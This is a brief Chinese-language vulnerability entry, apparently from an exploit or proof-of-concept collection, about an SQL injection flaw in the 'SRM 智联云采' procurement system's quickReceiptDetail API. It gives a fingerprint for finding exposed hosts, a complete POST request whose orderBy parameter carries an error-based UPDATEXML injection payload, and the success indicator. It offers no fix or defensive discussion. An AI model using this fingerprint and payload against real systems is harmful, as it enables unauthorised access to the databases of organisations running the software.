# SRM智联云采系统quickReceiptDetail存在SQL注入漏洞

SRM ｜ SQL注入 ｜ —
- **指纹**：`title=="SRM 2.0"`
- **请求**：`POST /adpweb/api/srm/delivery/quickReceiptDetail?orderBy=(UPDATEXML(8058,CONCAT(0x2e,0x71707a7671,(SELECT+(ELT(8058=8058,1))),0x71766a7671),3521)) HTTP/1.1`
- **响应特征**：200